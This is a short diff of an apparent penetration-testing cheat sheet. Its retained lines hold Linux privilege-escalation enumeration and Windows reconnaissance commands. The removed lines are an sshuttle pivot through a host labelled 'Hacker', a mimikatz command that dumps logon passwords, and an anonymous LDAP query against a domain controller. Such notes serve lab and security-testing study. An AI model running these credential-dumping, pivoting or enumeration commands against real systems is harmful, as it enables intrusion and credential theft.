@@ -57,16 +57,10 @@ perl -pi -e 'exec("id");'
 find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
 
 
-
-sshuttle -r Hacker@10.11.1.252:22000 10.2.2.0/24
-
-
-
 #####Windows#######
 
 
-.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
-ldapsearch -x -h 10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local"
+
 systeminfo | findstr OS && wmic OS get OSArchitecture
 query session
 netstat -na | find "LISTENING" | find ":445 "
